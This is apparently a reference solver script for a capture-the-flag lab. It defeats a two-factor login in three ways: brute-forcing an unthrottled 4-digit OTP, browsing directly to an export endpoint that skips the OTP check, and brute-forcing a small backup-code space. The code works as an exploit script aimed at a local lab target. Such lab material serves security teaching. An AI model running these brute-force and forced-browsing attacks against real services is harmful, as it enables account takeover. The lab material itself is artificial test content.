#!/usr/bin/env python3
"""Masquerade Operation 07 reference solver -- Ash walks past The Second Factor
three independent ways, each a different real-world 2FA failure.

The staff password is given; the whole mission is the OTP step. Three doors,
none of which needs the others:

  Stage 1 -- No rate limit. The OTP is 4 digits and the verify endpoint never
             throttles or locks out. Brute-force 0000-9999 until one is the
             real code. A second factor with no throttling is a short password.

  Stage 2 -- Forced browsing. A sensitive endpoint (the duty-roster export)
             checks the password step and forgets to check the OTP step. Sign
             in, request it directly, and the second gate simply isn't there --
             no code touched at all.

  Stage 3 -- Weak recovery. The "lost your phone, use a backup code" path
             accepts codes from a tiny, unthrottled KAFE-#### space -- weaker
             than the factor it replaces. Brute-force the backup code instead.

Each stage runs in its OWN fresh session, to prove none of them depends on any
other. A final sanity check confirms the vault itself IS properly gated -- so
Stage 2's export endpoint is genuinely the broken one.

Usage: python3 solver.py [base_url]
       (default: http://localhost:8000)
"""
import sys, re, requests

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8000").rstrip("/")
OP = f"{BASE}/masquerade/op7"
USER, PW = "night.duty", "KafeNight2024!"
FLAG_RE = re.compile(r"R6S\{[^}]+\}")


def login():
    """Clear the FIRST factor -- returns a session holding the half-authed cookie."""
    s = requests.Session()
    s.post(f"{OP}/login", data={"username": USER, "password": PW})
    return s


def flag_from(text):
    m = FLAG_RE.search(text)
    return m.group(0) if m else None


def stage1():
    print("[*] Stage 1 -- brute-forcing the 4-digit OTP (no rate limit, no lockout)")
    s = login()
    for i in range(10000):
        otp = f"{i:04d}"
        r = s.post(f"{OP}/api/verify-otp", data={"otp": otp})
        if r.json().get("ok"):
            print(f"    cracked OTP: {otp}  (after {i + 1} attempts, none of them slowed down)")
            v = s.get(f"{OP}/vault")
            print(f"[+] Stage 1 cleared -- vault reached, flag: {flag_from(v.text)}")
            return
    print("[!] Stage 1 failed -- no code accepted across the whole space.")


def stage2():
    print("\n[*] Stage 2 -- forced browsing straight to /roster/export, skipping the OTP")
    s = login()
    r = s.get(f"{OP}/roster/export")
    flag = flag_from(r.text)
    if flag:
        print(f"[+] Stage 2 cleared -- vault data leaked with NO second factor, flag: {flag}")
    else:
        print(f"[!] Stage 2 failed -- export did not leak the vault ({r.status_code}).")


def stage3():
    print("\n[*] Stage 3 -- brute-forcing a backup code (KAFE-####, tiny unthrottled space)")
    s = login()
    for i in range(10000):
        code = f"KAFE-{i:04d}"
        r = s.post(f"{OP}/api/recover", data={"backup": code})
        if r.json().get("ok"):
            print(f"    valid backup code: {code}  (after {i + 1} attempts)")
            v = s.get(f"{OP}/vault")
            print(f"[+] Stage 3 cleared -- vault reached via recovery, flag: {flag_from(v.text)}")
            return
    print("[!] Stage 3 failed -- no backup code accepted across the space.")


def sanity():
    print("\n[*] Sanity -- the vault itself is PROPERLY gated (proves Stage 2 is the real flaw)")
    s = login()  # first factor only, never verified
    r = s.get(f"{OP}/vault")
    gated = r.status_code == 403 and not flag_from(r.text)
    print(f"    /vault with password-only session -> {r.status_code}, no flag: {gated}")


def main():
    print(f"[*] Target: {OP}  (staff password given: {USER} / {PW})\n")
    stage1()
    stage2()
    stage3()
    sanity()
    print("\n[+] All three doors past the second factor confirmed independently.")


if __name__ == "__main__":
    main()
